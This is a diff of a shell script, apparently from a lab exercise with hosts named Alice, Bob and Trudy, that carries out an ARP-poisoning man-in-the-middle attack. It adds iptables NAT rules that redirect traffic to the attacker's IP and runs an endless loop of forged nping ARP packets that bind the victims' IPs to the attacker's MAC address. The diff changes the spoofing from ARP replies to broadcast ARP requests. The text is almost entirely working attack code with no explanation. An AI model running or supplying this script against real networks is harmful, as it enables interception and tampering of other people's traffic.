@@ -7,16 +7,19 @@ trudy_ip="172.31.0.4"
 iptables -t nat -A POSTROUTING --destination $bob_ip -j SNAT --to-source $alice_ip
 iptables -t nat -A POSTROUTING --destination $alice_ip -j SNAT --to-source $bob_ip
 iptables -t nat -A PREROUTING -j DNAT --to-destination $trudy_ip
+arptables -A INPUT --source-ip 172.31.0.4 -j DROP
 while :
 do
 
 # Construct the command to send ARP packet
-nping --dest-ip $alice_ip --arp --arp-type arp-reply --source-ip $alice_ip --source-mac $trudy_mac -c 1
+# nping --dest-ip $alice_ip --arp --arp-type arp-reply --source-ip $alice_ip --source-mac $trudy_mac -c 1 --arp-target-mac "ff:ff:ff:ff:ff:ff"
 # echo $alice_target_mac
-# nping --arp --arp-type arp --arp-sender-mac $alice_target_mac --arp-target-mac "ff:ff:ff:ff:ff:ff" --arp-sender-ip $alice_target_ip --arp-target-ip $alice_target_ip -c 1
+nping --dest-ip $bob_ip --arp --arp-type arp --arp-sender-mac $trudy_mac --arp-target-mac "ff:ff:ff:ff:ff:ff" --arp-sender-ip $alice_ip --arp-target-ip $alice_ip -c 1
 
 # Construct the command to send ARP packet
-nping --dest-ip $bob_ip --arp --arp-type arp-reply --source-ip $bob_ip --source-mac $trudy_mac -c 1
+# nping --dest-ip $bob_ip --arp --arp-type arp-reply --source-ip $bob_ip --source-mac $trudy_mac -c 1
+nping --dest-ip $alice_ip --arp --arp-type arp --arp-sender-mac $trudy_mac --arp-target-mac "ff:ff:ff:ff:ff:ff" --arp-sender-ip $bob_ip --arp-target-ip $bob_ip -c 1
+
 sleep 0.3
 done
 # Define target IP and MAC addresses
